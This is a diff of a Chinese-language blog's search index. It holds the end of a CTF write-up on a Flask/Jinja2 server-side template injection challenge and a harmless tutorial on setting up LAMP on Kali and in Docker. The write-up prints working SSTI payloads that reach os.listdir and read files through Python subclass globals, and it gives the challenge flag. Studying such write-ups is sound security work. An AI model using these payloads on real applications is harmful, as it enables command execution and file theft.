class="string">&#x27;click.core.Parameter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals._FakeSignal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers.locked_cached_property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers._PackageBoundObject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.DispatchingApp&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.ScriptInfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.config.ConfigAttribute&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx._AppCtxGlobals&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.AppContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.RequestContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.JSONTag&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.sessions.SessionInterface&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json._JSONModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.blueprints.BlueprintSetupState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext.Extension&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext._CommentFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving._SSLContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.BaseWSGIServer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;unicodedata.UCD&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;array.array&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method-wrapper&#x27;</span>&gt;] <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
+
+<p>可以在其中找到 **&lt;type ‘file’&gt;**类型 (可以进行文件读取)，下标是40(此项前面有40个’,’)</p>
+<p><strong>还可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong>，下表是71，构造payload进行命令执行</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">URL http://61.147.171.105:50859/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found</span><br></pre></td></tr></table></figure>
+
+<p>接下来构造读取flag payload</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ctf</span>&#123;f22b6844-<span class="number">5169</span>-<span class="number">4054</span>-b2a0-d95b9361cb57&#125;</span><br></pre></td></tr></table></figure>
+
+
+
 ]]></content>
       <categories>
-        <category>杂项</category>
+        <category>CTF_Writeup</category>
       </categories>
       <tags>
-        <tag>Web</tag>
-        <tag>LAMP</tag>
-        <tag>环境</tag>
+        <tag>CTF</tag>
+        <tag>Writeup</tag>
+        <tag>攻防世界</tag>
+        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
@@ -2121,6 +2062,65 @@
       <tags>
         <tag>CTF</tag>
         <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次搭建LAMP web环境</title>
+    <url>/2023/11/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BALAMP%20web%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<h1 id="搭建LAMP-web环境"><a href="#搭建LAMP-web环境" class="headerlink" title="搭建LAMP web环境"></a>搭建LAMP web环境</h1><h2 id="在虚拟机搭建web环境"><a href="#在虚拟机搭建web环境" class="headerlink" title="在虚拟机搭建web环境"></a>在虚拟机搭建web环境</h2><p>我的虚拟机系统是kali linux,里面已经有了Apache2和MySQL和PHP的环境</p>
+<p>终端输入<code>php -v</code>查看PHP版本</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105539.png"></p>
+<p>终端输入<code>service Apache2 start</code> 启动Apache服务</p>
+<p>终端输入<code>service MySQL start</code> 启动MySQL服务</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105283.png"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051105413.png"></p>
+<p>然后终端分别输入<code>service Apache2 status</code>和<code>service MySQL status</code>查看服务状态</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105653.png"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051105983.png"></p>
+<p>服务正常启动</p>
+<p>接下来在网站测试服务是否可用</p>
+<p>linux浏览器输入localhost，若回显页面</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105582.png"></p>
+<p>说明Apache服务正常</p>
+<p>接下来测试PHP服务，终端输入<code>cd /var/www/html</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051105350.png"></p>
+<p>在此目录下创建一个index.php文件，内容是phpinfo，输入<code>echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; index.php</code>(要在root权限下)</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106523.png"></p>
+<p>接下来在浏览器输入<code>localhost/index.php</code>,成功看到回显，说明PHP服务正常</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106180.png"></p>
+<p>以上做完说明web环境被成功搭建</p>
+<h2 id="在docker里搭建LAMP"><a href="#在docker里搭建LAMP" class="headerlink" title="在docker里搭建LAMP"></a>在docker里搭建LAMP</h2><p>在docker搭建lamp web环境，我这里选择拉取网上已经集成了MySQL服务和Apache服务的镜像(root权限下运行)</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106639.png"></p>
+<p>这里我选择linode&#x2F;lamp,输入<code>docker pull linode/lamp</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106325.png"></p>
+<p>输入<code>docker images</code>查看下载的镜像</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106503.png"></p>
+<p>输入<code>docker run -tid -p 8080:80 -p 3309:3306 -v /var/www/html:/var/www/html --name lamp linode/lamp /bin/bash</code>创建容器(-p 参数是指定端口映射 ，-v参数是指定目录映射，–name 为此容器创建名字)</p>
+<p>创建成功后查看正在运行的容器<code>docker ps</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106900.png"></p>
+<p>输入<code>docker exec -it 16b /bin/bash</code>进入容器(16b为容器id前3位)</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106366.png"></p>
+<p>和之前一样开启Apache和MySQL服务</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106049.png"></p>
+<p>在浏览器访问<code>localhost:8080</code>,如果出现无法访问的情况，则需要重启docker服务(exit退出容器)，退出容器后终端输入<code>systemctl restart docker</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106627.png"></p>
+<p>再<code>docker start 容器id</code>，重复开启Apache和MySQL服务过程，在浏览器访问<code>localhost:8080</code>页面回显证明容器中的Apache服务成功运行</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106455.png"></p>
+<p>接下来测试容器中PHP服务，容器中输入<code>cd var/www/example.com/public_html</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106861.png"></p>
+<p>输入<code>&quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 1.php</code>将测试php文件写入当前目录下</p>
+<p><img data-src="https://images.gaifagafin.top/202311051107831.png"></p>
+<p>浏览器输入<code>http://localhost:8080/1.php</code>访问测试php文件，看到回显，说明PHP服务也正常</p>
+<p><img data-src="https://images.gaifagafin.top/202311051107278.png"></p>
+<p>以上做完则成功在docker中搭建了lamp web环境</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>LAMP</tag>
+        <tag>环境</tag>
       </tags>
   </entry>
   <entry>
